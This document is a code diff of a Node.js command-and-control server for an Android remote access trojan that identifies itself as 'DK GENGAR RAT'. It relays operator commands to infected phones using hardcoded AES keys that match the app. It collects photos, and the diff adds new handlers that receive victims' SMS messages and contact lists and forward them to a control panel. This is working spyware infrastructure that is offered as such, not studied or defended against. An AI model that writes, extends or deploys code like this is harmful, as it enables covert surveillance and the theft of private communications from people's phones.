@@ -7,18 +7,13 @@ const crypto = require("crypto");
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    maxHttpBufferSize: 1e8, // 100MB
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    },
+    maxHttpBufferSize: 1e8, // 100MB para fotos
+    cors: { origin: "*", methods: ["GET", "POST"] },
     transports: ['websocket', 'polling']
 });
 
-// Memória de dispositivos conectados
 let connectedDevices = {};
 
-// Chave e IV para AES (Devem ser iguais aos do APK)
 const SECRET_KEY_STRING = "aGVsbG93b3JsZHNlY3JldGtleQ=="; 
 const IV_STRING = "aGVsbG93b3JsZGl2"; 
 
@@ -31,9 +26,7 @@ function decrypt(encryptedValue) {
         let decrypted = decipher.update(encryptedText);
         decrypted = Buffer.concat([decrypted, decipher.final()]);
         return decrypted.toString();
-    } catch (e) {
-        return null;
-    }
+    } catch (e) { return null; }
 }
 
 function encrypt(value) {
@@ -44,23 +37,14 @@ function encrypt(value) {
         let encrypted = cipher.update(value, 'utf8', 'base64');
         encrypted += cipher.final('base64');
         return encrypted;
-    } catch (e) {
-        return value;
-    }
+    } catch (e) { return value; }
 }
 
-app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "index.html"));
-});
-
-app.get("/health", (req, res) => {
-    res.status(200).send("OK");
-});
+app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "index.html")); });
+app.get("/health", (req, res) => { res.status(200).send("OK"); });
 
 io.on("connection", (socket) => {
     console.log(`[SISTEMA] Nova conexão: ${socket.id}`);
-
-    // Quando o painel (navegador) conecta, envia a lista de dispositivos atuais
     socket.emit("device_list", Object.values(connectedDevices));
 
     socket.on("register", (data) => {
@@ -71,24 +55,18 @@ io.on("connection", (socket) => {
                 if (decrypted) finalData = JSON.parse(decrypted);
                 else finalData = JSON.parse(data);
             }
-            
             finalData.socketId = socket.id;
             connectedDevices[socket.id] = finalData;
-            
             console.log(`[REGISTRO SUCESSO] Dispositivo: ${finalData.model}`);
             io.emit("new_device", finalData);
-        } catch (e) {
-            console.error("[ERRO REGISTRO]", e.message);
-        }
+            io.emit("device_list", Object.values(connectedDevices));
+        } catch (e) { console.error("[ERRO REGISTRO]", e.message); }
     });
 
     socket.on("command", (data) => {
         console.log(`[COMANDO] ${data.cmd} enviado`);
         const encryptedCmd = encrypt(JSON.stringify(data));
-        socket.broadcast.emit("command", {
-            plain: data,
-            encrypted: encryptedCmd
-        });
+        socket.broadcast.emit("command", { plain: data, encrypted: encryptedCmd });
     });
 
     socket.on("result", (encryptedData) => {
@@ -102,7 +80,7 @@ io.on("connection", (socket) => {
         if (decrypted) {
             const data = JSON.parse(decrypted);
             io.emit("display_photo", data.image);
-            io.emit("server_log", "📸 Foto recebida!");
+            io.emit("server_log", "📸 Foto recebida com sucesso!");
         }
     });
 
@@ -115,6 +93,27 @@ io.on("connection", (socket) => {
         }
     });
 
+    // Novos eventos para SMS e Contatos
+    socket.on("sms_received", (encryptedData) => {
+        const decrypted = decrypt(encryptedData);
+        if (decrypted) {
+            const data = JSON.parse(decrypted);
+            io.emit("data_received", { type: 'sms', from: data.from, body: data.body });
+            io.emit("server_log", `💬 Novo SMS de: ${data.from}`);
+        }
+    });
+
+    socket.on("contacts_received", (encryptedData) => {
+        const decrypted = decrypt(encryptedData);
+        if (decrypted) {
+            const contacts = JSON.parse(decrypted);
+            contacts.forEach(c => {
+                io.emit("data_received", { type: 'contact', name: c.name, number: c.number });
+            });
+            io.emit("server_log", `👥 ${contacts.length} Contatos recebidos!`);
+        }
+    });
+
     socket.on("disconnect", () => {
         console.log(`[SISTEMA] Conexão encerrada: ${socket.id}`);
         delete connectedDevices[socket.id];
@@ -124,5 +123,5 @@ io.on("connection", (socket) => {
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(`DK GENGAR RAT V1.6.6 rodando na porta ${PORT}`);
+    console.log(`DK GENGAR RAT V1.6.8 rodando na porta ${PORT}`);
 });
